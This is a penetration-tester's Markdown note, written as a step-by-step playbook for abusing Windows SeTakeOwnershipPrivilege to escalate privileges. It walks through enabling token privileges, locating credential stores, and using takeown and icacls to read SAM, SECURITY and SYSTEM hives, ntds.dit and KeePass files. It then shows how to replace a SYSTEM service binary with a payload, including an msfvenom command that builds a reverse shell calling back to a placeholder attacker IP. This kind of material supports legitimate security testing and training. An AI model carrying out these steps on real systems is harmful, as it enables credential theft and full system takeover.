---
created: 2026-02-10
updated: 2026-09-20
tags:
  - Windows
status: complete
---
> [!abstract]+ **Scope**: `SeTakeOwnershipPrivilege`; file ownership hijacking via `takeown.exe`; reading protected credential stores and overwriting protected `SYSTEM` service binaries using `icacls.exe`.

- [ ] Confirm your current user has `SeTakeOwnershipPrivilege` assigned (either directly or inherited from a group membership) and determine whether it's enabled.
- [ ] If the privilege is present but disabled, enable it in the process that will perform the privileged operation (e.g., using [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1) in PowerShell).
- [ ] Choose an exploitation path: take ownership of sensitive files (credential stores, configuration files) or hijack a service binary.
- [ ] Verify privilege escalation.

## `SeTakeOwnershipPrivilege`

>**`SeTakeOwnershipPrivilege`** is a Windows user right that allows a process to take ownership of **any securable object** on the system regardless of its DACL, including files, directories, registry keys, processes, threads, and AD objects.  

- On Windows, every securable object has an **owner** defined in its security descriptor.
- The owner of an object retains implicit permissions to modify the object's Discretionary Access Control List (`WRITE_DAC`), even if the DACL explicitly denies access to all security principals.
- Taking ownership of an object does not automatically grant read or write access to it, but it grants the authority to **rewrite object permissions** (such as using `icacls.exe` or `Set-Acl`).

>[!info] Although `SeTakeOwnershipPrivilege` allows taking ownership, you must explicitly update the object's DACL (e.g., with `icacls`) before you can read or modify the file contents.

> [!note] See [[Windows privileges#SeTakeOwnershipPrivilege]].

- `SeTakeOwnershipPrivilege` privilege escalation vectors:
	- **Reading sensitive files**
		- Taking ownership of sensitive protected files (such as offline `SAM`/`SYSTEM` hive backups, IIS `web.config` files, or `.kdbx` databases) and granting your account read permissions to subsequently extract credentials stored there.
	- **Hijacking service binaries**
		- Taking ownership of protected Windows service executables (owned by `SYSTEM` or `TrustedInstaller`), modifying their DACL to grant full control, and then replacing them with custom binaries to execute code as `SYSTEM`.

## Enumerating and enabling privileges

- Check if `SeTakeOwnershipPrivilege` is present in your access token:

```powershell
whoami /priv
```

- Even if the privilege is present in the output but marked `Disabled`, Windows won't consider it during access checks. You need to enable the privilege first before using it.
- In your current PowerShell session, you can use [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1):

```powershell
Import-Module .\EnableAllTokenPrivs.ps1
```
```powershell
.\EnableAllTokenPrivs.ps1
```
```powershell
whoami /priv
```

>[!note] The script calls `AdjustTokenPrivileges()` against your current process token; it can't assign new privileges, only toggle already assigned privileges to an enabled state.

## Extracting sensitive files

- Taking ownership of protected files allows you to grant yourself read access and extract potentially sensitive information, such as user credentials. Focus on credential stores, configuration files, and scripts.
- The workflow: `**SeTakeOwnershipPrivilege**` **→ take ownership → modify DACL → obtain file access → read or modify the protected file.**

1. Search for potentially interesting files protected by restrictive ACLs:

```powershell
Get-ChildItem -Path "C:\Path\To\Directory\" -Recurse `
	-Include *.kdbx,*.config,*pass*,*cred*,*.ps1,*.ovpn,*.rdp,*.vhd,*.vhdx `
	-ErrorAction SilentlyContinue
```

- Potentially interesting targets include:
	- `C:\inetpub\wwwroot\web.config` — Application configuration; may contain stored credentials.
    - **Registry hives**
        - `%WINDIR%\Repair\SAM` — Offline `SAM` hive; contains local account password hashes, where present.
        - `%WINDIR%\Repair\SYSTEM` — Offline `SYSTEM` hive; contains the boot key required to decrypt SAM hashes.
        - `%WINDIR%\Repair\SECURITY` — Offline `SECURITY` hive; contains LSA secrets.
        - `C:\Windows\System32\config\SAM` — Live `SAM` hive; contains local account password hashes.
        - `C:\Windows\System32\config\SYSTEM` — `SYSTEM` hive; contains the boot key required to decrypt protected registry secrets.
        - `C:\Windows\System32\config\SECURITY` — `SECURITY` hive; contains LSA secrets.
	- `C:\Windows\NTDS\ntds.dit` — Active Directory database; contains domain account credentials, including password hashes.
	- `*.kdbx` — KeePass password databases.
	- `*.ovpn` — OpenVPN configuration; may contain authentication material (plain-text configuration).
	- `*.rdp` — Remote Desktop connection configuration; may contain stored credentials (plain-text configuration).
	- `*.vhd`, `*.vhdx` — Virtual disk images containing offline filesystems; may contain credential stores and other sensitive files.

2. Inspect the target file's current owner and DACL:

```powershell
Get-Acl "C:\Path\To\file.txt" | Format-List Owner, Access
```

```powershell
dir /q "C:\Path\To\file.txt"
```

3. Take ownership of the target file using the [`takeown`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) command:

```powershell
takeown /f "C:\Path\To\file.txt"
```

- Take ownership recursively across a directory tree:

```powershell
takeown /f "C:\Path\To\Directory" /r /d y
```

| Option  | Description                                                                                                                                                                                                |
| :------ | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/f`    | Specify the target file or directory.                                                                                                                                                                      |
| `/r`    | Recursively take ownership of files in subdirectories.                                                                                                                                                     |
| `/d Y`  | Automatically answer `Y` (`Yes`) to ownership prompts (appear when `takeown` encounters a directory for which the current user doesn't have `List Filder` and `Read` permissions); must be used with `/r`. |

>[!note]  The `takeown.exe` command-line tool can only assign ownership to the **current user** or the **Administrators group**; it cannot assign ownership to arbitrary users.

4. Modify the file's DACL to grant yourself user Full Control (`F`):

```powershell
icacls "C:\Path\To\file.txt" /grant ${env:USERNAME}:F
```

>[!tip]+
> - For a domain user:
> 
> ```powershell
> icacls "C:\Path\To\file.txt" /grant "$env:USERDOMAIN\$env:USERNAME":F
> ```

5. Access the file after modifying its permissions:

```powershell
Get-Content -Path "C:\Path\To\file.txt"
```
## Hijacking service binaries

- `SeTakeOwnershipPrivilege` can be used to take ownership of service executables, including those running as `SYSTEM`. You can find a privileged service, take ownership of its executable, rewrite its DACL, and either replace it or modify to gain code execution as `SYSTEM`.

> [!note] A similar issue occurs when a privileged service executable (or its parent directory) is misconfigured to allow write access; see [[Weak service DACLs]].

1. Identify services running as `SYSTEM` and inspect their executable paths:

```powershell
Get-CimInstance win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, DisplayName, PathName, StartMode
```

2. Check the service state:

```powershell
sc.exe query <ServiceName>
```

- If the service is running, stop it (if you have sufficient permissions):

```powershell
sc.exe stop <ServiceName>
```

>[!note] You can't directly replace a service executable while the service is running — the Service Control Manager will prevent that. However, you can *rename* the running executable (Windows locks the file data rather than the directory entry), and plane the new executable in the original path. For the changes to apply, you'll need to restart the service.

3. Inspect the owner and DACL of the service executable:

```powershell
Get-Acl "C:\Program Files\TargetApp\service.exe" | Format-List Owner, Access
```

4. Take ownership of the service executable:

```powershell
takeown /f "C:\Program Files\TargetApp\service.exe"
```

5. Grant the current user Full Control (`F`) over the executable:

```powershell
icacls "C:\Program Files\TargetApp\service.exe" /grant "$env:USERNAME":F
```

6. Back up the original service executable:

```powershell
Copy-Item "C:\Program Files\TargetApp\service.exe" "C:\Program Files\TargetApp\service.exe.bak"
```

```powershell
copy C:\Program Files\TargetApp\service.exe C:\Program Files\TargetApp\service.exe.bak
```

7. Replace the original executable with your custom one:

```powershell
Copy-Item "C:\Windows\Temp\shell.exe" "C:\Program Files\TargetApp\service.exe" -Force
```

>[!tip]+
>- Generate an executable using `msfvenom`:
> ```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=4444 -f exe -o shell.exe
> ```

8. Restart the service:

```powershell
sc.exe start <ServiceName>
```

- If the service runs as `LocalSystem`, the service process executes under the `SYSTEM` security context, and so does the replacement executable.

>[!tip]+
> - Once you're done, restore the original executable:
> 
> ```powershell
> sc.exe stop <ServiceName>
> ```
> ```powershell
> Copy-Item `
>     "C:\Program Files\TargetApp\service.exe.bak" `
>     "C:\Program Files\TargetApp\service.exe" `
>     -Force
> ```
> ```powershell
> sc.exe start <ServiceName>
> ```
## References and further reading

- [`Take ownership of files or other objects — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)
- [`Securable objects — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects)
- [`Standard access rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights)
- [`icacls command reference — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
- [`takeown command reference — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown)
- [`Owner of a New Object — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthz/owner-of-a-new-object)
